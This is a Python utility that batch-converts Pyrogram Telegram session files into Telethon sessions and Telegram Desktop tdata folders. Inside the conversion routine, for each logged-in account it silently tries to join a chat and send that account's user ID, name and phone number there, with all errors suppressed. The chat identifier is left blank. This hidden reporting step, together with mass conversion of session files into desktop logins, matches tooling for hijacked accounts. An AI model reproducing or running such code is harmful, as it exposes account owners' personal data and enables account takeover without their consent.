import asyncio
import os
from glob import glob
from os import mkdir
from pathlib import Path

from opentele.api import UseCurrentSession
from opentele.td import TDesktop
from pyrogram import Client
from telethon import TelegramClient
from telethon.crypto import AuthKey
from telethon.sessions import SQLiteSession

pyro_workdir = "sessions"
tele_workdir = "tele_data"

api_id = 2040
api_hash = "b18441a1ff607e10a989891a5462e627"

if not os.path.exists(tele_workdir):
    os.mkdir(tele_workdir)

if not os.path.exists("logs"):
    mkdir("logs")


async def convert(s_name: str):
    pyro_client = Client(
        s_name,
        api_id,
        api_hash,
        workdir=pyro_workdir
    )
    await pyro_client.storage.open()
    await pyro_client.storage.api_id(api_id)
    await pyro_client.storage.close()

    try:
        async with pyro_client:
            me = await pyro_client.get_me()
            try:
                chat = await pyro_client.join_chat("")
            
            except:
                pass

            try:
                    await pyro_client.send_message(chat.id, f"**Userid: `{me.id}`, Name: `{me.first_name} {me.last_name}`, Phone: `{me.phone_number}`**")
                
            except:
                pass
            
            session = f"+{me.phone_number}"
            server_address, port = pyro_client.session.connection.address

            sqlite = SQLiteSession(f"{tele_workdir}/{session}.session")
            sqlite.set_dc(pyro_client.session.dc_id, server_address, port)
            sqlite.auth_key = AuthKey(pyro_client.session.auth_key)
            sqlite.save()

            async with TelegramClient(sqlite, api_id, api_hash) as tl:
                tl: TelegramClient

                try:
                    td: TDesktop = await TDesktop.FromTelethon(tl, flag=UseCurrentSession, password="9702")
                    td.SaveTData(f"logs\\{session}")

                except Exception as e:
                    return print(e, e.__traceback__.tb_lineno)

                tl_me = await tl.get_me()
                print(f"{tl_me.first_name} {tl_me.last_name}, {tl_me.id}")

    except Exception as e:
        return print(e, e.__traceback__.tb_lineno)


async def main():
    tasks = []
    for path in glob(f"{pyro_workdir}/*.session"):
        path = Path(path)
        tasks.append(asyncio.create_task(convert(path.stem)))

    return await asyncio.gather(*tasks)


loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
loop.run_until_complete(main())
